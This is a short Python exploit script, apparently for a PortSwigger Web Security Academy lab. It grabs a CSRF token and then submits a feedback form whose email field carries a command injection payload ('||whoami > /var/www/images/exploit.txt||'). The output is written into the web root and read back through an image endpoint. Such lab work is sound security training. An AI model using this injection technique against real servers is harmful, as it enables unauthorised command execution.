import requests
from lxml import html
from rich.console import Console


console = Console()


SERVER="https://0ab7000704c314f3c0ed34680036008e.web-security-academy.net"
ENDPOINT="/feedback/submit"

def injectable_params(server, session):
    
    response = session.get(f"{SERVER}/feedback")
    console.log(f"Get status code {response.status_code}")
    html_document = html.fromstring(response.content)
    csrf_token = html_document.xpath("//input[@name = 'csrf']/@value")[0]
    console.log(f"CSRF Token = {csrf_token}")
    
    params = {
    "csrf": csrf_token, 
    "name": 'foo', 
    "email": '||whoami > /var/www/images/exploit.txt||', 
    "subject": 'ciccio',
    "message": 'wewe'
    }

    response=session.post(f"{server}{ENDPOINT}", data=params)

    console.log(f"Post status code {response.status_code}") 

def get_file(server):
    response=requests.get(f"{server}/image?filename=exploit.txt")
    console.log(f"Command Get response = {response.text}")
    


def main(server=SERVER):
    session = requests.Session()
    injectable_params(server, session)
    get_file(server)

if __name__ == "__main__":
    main()
